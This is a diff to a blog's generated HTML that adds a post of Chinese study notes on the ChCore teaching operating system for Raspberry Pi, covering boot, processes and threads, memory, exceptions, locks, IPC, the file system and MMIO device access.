+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="szy">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="S blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | S blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/01/22/chcore/chcore/" class="post-title-link" itemprop="url">chcore</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2024-01-22 20:26:50" itemprop="dateCreated datePublished" datetime="2024-01-22T20:26:50+08:00">2024-01-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/chcore/" itemprop="url" rel="index"><span itemprop="name">chcore</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>3.4k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>13 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="chcore"><a href="#chcore" class="headerlink" title="chcore"></a>chcore</h1><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><ol>
+<li><p>start.S </p>
+<p><code>mpidr</code>拿到cpu核编号，其他核等待 主核设置<code>scr</code> <code>elr</code>(返回地址) <code>spsr</code>(异常状态) 切换到el1</p>
+<p>设置栈地址</p>
+</li>
+<li><p>init_c</p>
+<p>清理bss</p>
+<p>初始化uart</p>
+<p>初始化页表</p>
+<p>激活mmu</p>
+</li>
+<li><p>start_kernel</p>
+<p>重新设置栈(高地址)</p>
+<p>关掉对低地址(<code>ttbr0</code>)的翻译 flush tlb</p>
+</li>
+<li><p>main</p>
+<p>初始化锁</p>
+<p>初始化物理内存分配系统</p>
+<p><code>set_exception_vector</code> 初始化异常向量表 打开中断</p>
+<p>初始化调度策略（链表，idle线程）</p>
+<p>激活其他线程</p>
+<p>拿锁 根据指定配置创建root线程 这里<code>create_root_thread</code>会先创建root进程再创建线程</p>
+<p>调度 切换上下文 返回用户态</p>
+</li>
+</ol>
+<h2 id="进程与线程"><a href="#进程与线程" class="headerlink" title="进程与线程"></a>进程与线程</h2><p><code>cap_group</code>是进程的抽象，元数据包括其拥有的所有的内核对象，例如vmspace，Capability是访问某个内核对象的令牌</p>
+<p>进程只是获取资源和原理资源的对象，单独创建没有意义，需要填入创建线程需要的参数中然后创建线程。</p>
+<p>创建线程并加载用户文件有两个函数：</p>
+<ul>
+<li><p><code>load_binary</code> 解析elf 创建pmo，建立映射，复制数据，拿到pc并返回用于创建线程，在内核态创建root的线程的时候使用</p>
+</li>
+<li><p><code>launch_process</code>解析elf 通过系统调用创建pmo并映射 <code>spawn</code>之前的<code>parse_elf_from_binary</code>已经为每个段都拿到了pmo并复制，<code>launch_process</code>中只要为每个段建立映射即可</p>
+<p>libchore是额外提供的库，用户态程序，基本都是通过syscall和内核交互完成功能，提供<code>spawn</code>等函数</p>
+</li>
+</ul>
+<p>线程调度在内核态完成</p>
+<p>进程管理在用户态的procm server完成</p>
+<p>存在crt0的几个函数用汇编写入main外层的<code>_start</code>函数，并在main调用之后调用进程退出和线程退出函数</p>
+<p>猜测这个libchore的crt0函数会和用户程序一同编译</p>
+<h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><p><code>0xffff_0000_0000_0000 + addr</code> 映射到 <code>addr</code></p>
+<p>树莓派规定<code>0x00000000</code>~&#96;0x3f000000&#96; 物理地址会去主存访问，再大的物理地址会去对应的外设访问，与型号有关。</p>
+<p>buddy system虽然是管理物理内存的，但是所有的操作都是针对虚拟地址的。由于之前已经进行过大块映射。所以一整块连续内存对内核来说是可以直接给buddy system使用的，把对应地址转为page*即可</p>
+<p>页表会从buddy system拿到页地址，但是存储再页表项中的地址必须转换为物理地址。</p>
+<p>pmo作为一个资源对象，记录了物理内存资源。用radix tree做索引，key是虚拟内存的page编号，value是对应的物理内存地址。</p>
+<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><ol>
+<li><p><code>exception_entry</code> 保存上下文到栈中 这里使用的栈已经是内核栈了</p>
+</li>
+<li><p>进入对应的处理entry，esr寄存器可判断异常原因，传入后续c函数</p>
+</li>
+<li><p>如果是syscall，跳转到syscall_table的entry</p>
+<p>如果是其他，例如page fault，进入handle_entry.c 根据esr判断并处理</p>
+<p>如果是时钟中断，<code>sched_handle_timer_irq</code>会做和调度相关的事情</p>
+</li>
+</ol>
+<h2 id="锁与信号量"><a href="#锁与信号量" class="headerlink" title="锁与信号量"></a>锁与信号量</h2><p>chcore中存在以下不同的实现</p>
+<ol>
+<li><p>通过硬件提供的特殊load和store指令实现fetch_and_add 随后再实现ticket lock，一把大锁，一进内核就拿</p>
+</li>
+<li><p>信号量记录当前线程等待的线程信息，通过加入和移除调度队列实现 。waitpid通过信号量的wait和signal实现</p>
+</li>
+<li><p>用二元信号量可在用户态实现互斥锁</p>
+</li>
+<li><p>gcc有内置的api <code>__sync_fetch_and_add</code> <code>__sync_lock_test_and_set</code>  不需要任何头文件可以使用，用这个也能实现锁 但是这里依赖了已经存在的编译器，并不是从0写操作系统。</p>
+</li>
+</ol>
+<h2 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h2><h3 id="执行流"><a href="#执行流" class="headerlink" title="执行流"></a>执行流</h3><p>client先register_client，需要知道想要通信的服务端进程。</p>
+<p>创建连接会为服务端进程再创建一个线程，设置相同的vmspace (每个client都会在服务器进程创建一个线程作为单独的连接对象)</p>
+<p>client ipc_call时，不用sched，而是直接switch到target，将自己设置为waiting，不加入等待队列。需要设置参数和target为服务端的处理函数。</p>
+<p>server ipc_return时，设置client为running后直接switch到client，设置返回值</p>
+<p>由于ipc的操作都是进内核的，eret会直接返回到用户态，因此server返回到client时，执行ipc_call的下一条指令，切换到server的调用链直接被中止。由于ret addr不使用栈，因此也不会对内核栈产生很大的破坏。</p>
+<h3 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h3><p>每个connection会创建pmo，同时映射到client和server的地址空间</p>
+<p>client和server的thread是一对一的，但是即使是不同的thread也是服务在同一个写死的地址上，所以需要根据不同情况算偏移找不同的位置。</p>
+<ul>
+<li>server: 同一个dispatch会需要支持不同client访问，每次create_connection时会得到不同的连接，server对于IPC提供的缓冲区根据不同connection id找到偏移 服务不同客户</li>
+<li>client：同一个cilent会需要和不同的server通信，每次register client会拿到不同client id，client对于IPC提供的缓冲区根据不同的client id找到偏移，请求不同的服务</li>
+</ul>
+<p>每个client创建pmo，然后映射到服务端的地址都不会重复。buf和stack各需要一个pmo</p>
+<ul>
+<li><p><code>buf_addr</code>为A-stack client server共享内存 传递参数</p>
+</li>
+<li><p><code>stack_addr</code>为E-stack server thread执行用</p>
+</li>
+</ul>
+<h3 id="消息传递"><a href="#消息传递" class="headerlink" title="消息传递"></a>消息传递</h3><p>client通过<code>ipc_create_msg</code> 会把消息直接写入到共享内存的开头，在迁移线程时设置地址为服务端共享内存地址即可（两端虚拟地址不一样，但物理地址一样）</p>
+<p>共享内存首地址即为msg对象(元数据)，而紧接着msg对象的就是msg所带data </p>
+<p>可以自己为每种不同的IPC定义request结构体，然后直接进行类型转换</p>
+<p>以文件系统为例，共享内存布局如下</p>
+<p>msg元数据—fs_request元数据—文件数据</p>
+<h3 id="cap"><a href="#cap" class="headerlink" title="cap"></a>cap</h3><p>需要传递资源给server</p>
+<p>很多IPC的操作是被写在kernel里的，kernel的地址空间是共用的，因此即使是不同进程本地修改cap，在context switch到另一个进程时，修改仍有效</p>
+<h2 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h2><p>文件系统全是用户态程序</p>
+<p>File System Manager实现VFS抽象，在内存中维护一个链表，每个节点包含path和对应的文件系统server的结构体</p>
+<p>inode记录的block块号除了用连续的数组，还可用radix tree，key是page编号，value是page地址（block块号）</p>
+<h2 id="外设"><a href="#外设" class="headerlink" title="外设"></a>外设</h2><p>参考<a target="_blank" rel="noopener" href="https://github.com/s-matyukevich/raspberry-pi-os/blob/master/docs/lesson01/rpi-os.md">raspberry-pi-os&#x2F;rpi-os.md at master · s-matyukevich&#x2F;raspberry-pi-os · GitHub</a>及BCM2837树莓派外设手册可知，对于树莓派，硬件本身(MMU)规定了一段物理地址是专门用于访问外设的（BCM2837为0x30000000-0x3F000000）。由1.2节可知，当MMU第一次把虚拟地址翻译为物理地址后，还会通过另一个VC&#x2F;ARM MMU把物理地址翻译为总线地址。最后选择是访问主存还是外设。这里VC&#x2F;ARM MMU会把0x30000000的物理地址直接映射到0x7E000000。</p>
+<p>同时，第五章EMMC可知，EMMC寄存器基地址被规定为0x7E300000，也就是说，只要操作系统访问0x30300000的物理地址，就能做到和SD卡进行交互而非RAM。</p>
+<p>chcore先通过syscall创建pmo并映射，pmo对应的物理地址即是树莓派手册规定的用于访问外设+具体外设的地址。当访问这块物理内存时，树莓派会交由sd卡处理。同时，内存映射仍由操作系统管理，所以需要页表对应的PTE会被标记为device，使得这些页不进入缓存。</p>
+<p>进行读写等操作时，chcore会先通过mmio写一些寄存器，设置必要的参数(例如block号)，随后可以在指定内存位置进行读写(<code>EMMC_DATA</code>)。</p>
+<p>对MMIO地址使用的<code>read32</code> <code>write32</code>接口使用的地址均用<code>volatile</code>修饰，保证可以看到硬件提供的最真实的数据。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1585,13 +2165,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="Word count total">184k</span>
+    <span title="Word count total">189k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">11:08</span>
+    <span title="Reading time total">11:27</span>
   </span>
 </div>
 <div class="busuanzi-count">
